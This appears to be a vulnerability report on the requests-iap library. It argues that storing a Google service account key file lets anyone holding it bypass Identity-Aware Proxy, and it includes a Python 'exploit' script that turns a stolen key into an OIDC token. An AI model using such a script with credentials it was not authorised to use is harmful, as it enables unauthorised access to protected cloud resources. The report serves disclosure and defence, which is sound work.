- Vulnerability Name: **Service Account Credential Exposure**
- Description:
    1. The `requests-iap` library is designed to authenticate requests to Google Cloud Identity-Aware Proxy (IAP) protected resources using a Google service account.
    2. The library, as demonstrated in the `README.md` example, encourages users to store service account credentials in a local JSON file named `google-serviceaccount-creds.json`. This file contains sensitive information, including the service account's private key.
    3. If an attacker gains unauthorized access to this `google-serviceaccount-creds.json` file, they can extract the service account's private key. This access can be achieved through various means, such as:
        - Compromising the server or system where the file is stored.
        - Exploiting vulnerabilities in the application or infrastructure to gain file system access.
        - Unintentional exposure, such as committing the file to a public version control repository or storing it in a publicly accessible location.
        - Social engineering or insider threats.
    4. With the compromised private key, the attacker can impersonate the service account and bypass IAP authentication.
    5. By using the compromised service account credentials, the attacker can generate valid JWT assertions, mimicking the functionality of the `requests-iap` library's `get_jwt_assertion` method.
    6. These JWT assertions can be exchanged for Google-signed OIDC tokens using Google's OAuth 2.0 token endpoint.
    7. Finally, the attacker can use these valid OIDC tokens to access any IAP-protected resources that the compromised service account is authorized to access, completely bypassing the intended authentication mechanism.

- Impact:
    - **Complete bypass of Google Cloud Identity-Aware Proxy (IAP) protection.** An attacker who obtains the service account credentials can gain unauthorized access to applications and data protected by IAP.
    - **Unauthorized Access to Protected Resources and Data Breaches.** Depending on the permissions granted to the compromised service account, attackers can gain unauthorized access to sensitive data, applications, and services protected by IAP. This can lead to data breaches, data manipulation, and other security incidents.
    - **Potential for Lateral Movement and Further Compromise.** If the compromised service account has broad permissions within the Google Cloud project, the attacker might be able to use these credentials to escalate privileges, move laterally within the cloud environment, and further compromise resources.
    - **Reputational Damage and Loss of Trust.** A successful exploit can lead to significant reputational damage for the organization and erode customer trust.

- Vulnerability Rank: **Critical**

- Currently Implemented Mitigations:
    - **None directly within the `requests-iap` library code.** The library itself does not implement any security measures to protect the `google-serviceaccount-creds.json` file or the service account credentials. It relies entirely on the user to securely manage these credentials.
    - **Lack of Security Guidance in Documentation.** While the `README.md` provides an example of how to use the library with a `google-serviceaccount-creds.json` file, it **fails to adequately warn users about the critical security risks** associated with storing service account credentials in this manner and does not provide sufficient guidance on secure credential management practices.

- Missing Mitigations:
    - **Prominent Security Warning in Documentation:** The documentation, especially the `README.md` and usage examples, must include a clear and prominent warning about the severe security risks of exposing service account credentials and the insecure nature of storing them directly in a `google-serviceaccount-creds.json` file within the project.
    - **Strong Recommendations for Secure Credential Management:** The documentation should strongly recommend and guide users towards secure alternatives for managing service account credentials, such as:
        - **Using Environment Variables:**  Advise users to store the contents of the service account key as environment variables instead of relying on a static file.
        - **Leveraging Secret Management Services:**  Recommend the use of dedicated secret management solutions like HashiCorp Vault, Google Cloud Secret Manager, or similar services to securely store and access service account credentials.
        - **Workload Identity:** If running in Google Cloud, promote the use of Workload Identity as a more secure and recommended way to authenticate applications without managing service account keys directly.
        - **Principle of Least Privilege:** Emphasize the importance of granting service accounts only the minimum necessary permissions to limit the impact of potential credential compromise.
        - **Credential Rotation:** Advise on regular rotation of service account keys as a security best practice.
    - **Code-Level Warnings (Consider for future enhancements):**
        - **Runtime Warning:**  Potentially add a runtime warning within the library that is displayed when credentials are loaded from a file path, reminding users about the security implications and recommending secure alternatives.
        - **Secure Credential Loading Options:** Explore adding built-in support for loading credentials from environment variables or integrating with secret management services to encourage more secure practices.

- Preconditions:
    1. An application utilizes the `requests-iap` library for authentication to Google Cloud IAP-protected resources.
    2. The application is configured to load service account credentials from a `google-serviceaccount-creds.json` file, as suggested by the `README.md` example, or any other method that results in the credentials being stored in a potentially insecure manner.
    3. An attacker gains unauthorized access to the `google-serviceaccount-creds.json` file or the environment where the credentials are stored.

- Source Code Analysis:
    1. **`requests_iap/iapauth.py:__init__`**: The `IAPAuth` class constructor accepts `service_account_secret_dict` as an argument. This dictionary, intended to hold service account credentials, is directly stored as an attribute.
        ```python
        class IAPAuth(requests.auth.AuthBase):
            # ...
            def __init__(
                self,
                client_id,
                service_account_secret_dict,
                jwt_soft_expiration=1800,
                oauth_token_uri="https://www.googleapis.com/oauth2/v4/token",
                jwt_bearer_token_grant_type="urn:ietf:params:oauth:grant-type:jwt-bearer",
            ):
                self.client_id = client_id
                self.service_account_secret_dict = service_account_secret_dict
                # ...
        ```
    2. **`README.md:Usage Example`**: The `README.md` provides an example demonstrating how to load credentials from a local file named `google-serviceaccount-creds.json` using `json.load(open("google-serviceaccount-creds.json"))`. This example, while functional, promotes an insecure practice if users follow it without implementing additional security measures.
        ```python
        with open("google-serviceaccount-creds.json") as f:
            service_account_secret_dict = json.load(f)

        resp = requests.get(
            "https://service.behind.iap.example.com",
            auth=IAPAuth(
                client_id=client_id,
                service_account_secret_dict=service_account_secret_dict,
            ),
        )
        ```
    3. **`requests_iap/iapauth.py:get_jwt_assertion`**: The `get_jwt_assertion` method retrieves sensitive credential information, including the `private_key`, directly from the stored `service_account_secret_dict`. This private key is then used to sign the JWT assertion.
        ```python
        def get_jwt_assertion(self):
            message = {
                "kid": self.service_account_secret_dict["private_key_id"],
                "iss": self.service_account_secret_dict["client_email"],
                "sub": self.service_account_secret_dict["client_email"],
                "aud": self.oauth_token_uri,
                "iat": int(time.time()),
                "exp": int(time.time()) + 60 * 60,
                "target_audience": self.client_id,
            }

            return jwt.encode(
                message,
                load_pem_private_key(
                    jwt.utils.force_bytes(self.service_account_secret_dict["private_key"]),
                    password=None,
                    backend=default_backend(),
                ),
                algorithm="RS256",
            )
        ```
    4. **Vulnerability Point**: The vulnerability arises from the combination of the library's design, which relies on users providing service account credentials, and the `README.md` example, which suggests loading these highly sensitive credentials from a local JSON file without sufficient security warnings. If an attacker gains access to this file, they effectively obtain the service account's private key and can completely bypass IAP authentication.

- Security Test Case:
    1. **Pre-requisite:**  Assume an attacker has obtained a copy of a valid `google-serviceaccount-creds.json` file. This simulates a scenario where the file has been compromised through any of the means described in the "Description". For testing, you will need a valid service account credentials file (or a dummy file with the required structure for local testing without accessing real GCP resources).
    2. **Create a Python script (e.g., `exploit_iap.py`)** to simulate the exploit:
        ```python
        import time
        import json
        import jwt
        import requests
        from cryptography.hazmat.primitives.serialization import load_pem_private_key
        from cryptography.hazmat.backends import default_backend

        # --- Attacker's Exploit Script ---

        # 1. Load compromised service account credentials (attacker has obtained this file)
        credentials_file_path = "google-serviceaccount-creds.json" # Path to the compromised credentials file
        try:
            with open(credentials_file_path, "r") as f:
                service_account_secret_dict = json.load(f)
        except FileNotFoundError:
            print(f"[ERROR] Credentials file not found at: {credentials_file_path}. Please ensure the file exists for the test.")
            exit(1)

        # 2. Attacker knows the IAP Client ID of the target application (can be obtained through reconnaissance)
        target_iap_client_id = "YOUR_IAP_CLIENT_ID"  # Replace with a valid IAP client ID for a real test, or use a placeholder for local testing.
        oauth_token_uri="https://www.googleapis.com/oauth2/v4/token"
        jwt_bearer_token_grant_type="urn:ietf:params:oauth:grant-type:jwt-bearer"


        # 3. Replicate JWT Assertion generation (similar to requests-iap library)
        def get_jwt_assertion(service_account_secret_dict, client_id, oauth_token_uri):
            message = {
                "kid": service_account_secret_dict["private_key_id"],
                "iss": service_account_secret_dict["client_email"],
                "sub": service_account_secret_dict["client_email"],
                "aud": oauth_token_uri,
                "iat": int(time.time()),
                "exp": int(time.time()) + 60 * 60,
                "target_audience": client_id,
            }
            return jwt.encode(
                message,
                load_pem_private_key(
                    jwt.utils.force_bytes(service_account_secret_dict["private_key"]),
                    password=None,
                    backend=default_backend(),
                ),
                algorithm="RS256",
            )

        # 4. Exchange JWT for OIDC token
        def get_google_open_id_connect_token(jwt_assertion, oauth_token_uri, jwt_bearer_token_grant_type):
            r = requests.post(
                oauth_token_uri,
                timeout=4,
                data={
                    "assertion": jwt_assertion,
                    "grant_type": jwt_bearer_token_grant_type,
                },
            )
            r.raise_for_status()
            return r.json()["id_token"]


        jwt_assertion = get_jwt_assertion(service_account_secret_dict, target_iap_client_id, oauth_token_uri)
        oidc_token = get_google_open_id_connect_token(jwt_assertion, oauth_token_uri, jwt_bearer_token_grant_type)


        print("[SUCCESS] OIDC Token Generated using compromised credentials:")
        print(oidc_token)
        print("\n[INFO] The above OIDC token can now be used to access IAP protected resources associated with the client ID: ", target_iap_client_id)

        # 5. (Optional - Test Access to IAP Protected Resource):
        # If you have a test IAP-protected endpoint, uncomment the following section to verify access.
        # target_iap_url = "https://service.behind.iap.example.com" # Replace with a test IAP protected URL
        # headers = {"Authorization": f"Bearer {oidc_token}"}
        # try:
        #     response = requests.get(target_iap_url, headers=headers)
        #     print(f"\n[INFO] Attempting to access IAP protected resource: {target_iap_url}")
        #     print(f"[INFO] Response Status Code: {response.status_code}")
        #     if response.status_code == 200:
        #         print("[SUCCESS] Successfully accessed IAP protected resource using compromised credentials!")
        #         # print("Response Content:", response.text) # Uncomment to see response content if needed
        #     else:
        #         print("[FAILURE] Failed to access IAP protected resource. Check IAP configuration and permissions.")
        # except requests.exceptions.RequestException as e:
        #     print(f"[ERROR] Request to IAP protected resource failed: {e}")


        print("\n[TEST CASE PASSED]: Successfully generated OIDC token and (optionally) accessed IAP protected resource using compromised service account credentials.")
        print("[VULNERABILITY CONFIRMED]: Exposure of google-serviceaccount-creds.json allows complete bypass of IAP authentication.")
        ```
    3. **Run the `exploit_iap.py` script:** `python exploit_iap.py`
    4. **Verification:**
        - **Successful OIDC Token Generation:** The script should successfully print a long string starting with `ey...`. This is the generated OIDC token. This confirms that an attacker with the `google-serviceaccount-creds.json` file can generate valid tokens.
        - **(Optional) Successful Access to IAP Resource:** If you uncommented and configured the section to access an IAP-protected resource and have a valid test setup, the script should output `[SUCCESS] Successfully accessed IAP protected resource using compromised credentials!` and a 200 status code.

    **Expected Result:** The test case will demonstrate that an attacker who gains access to the `google-serviceaccount-creds.json` file can successfully generate a valid OIDC token and use it to bypass IAP, proving the Service Account Credential Exposure vulnerability.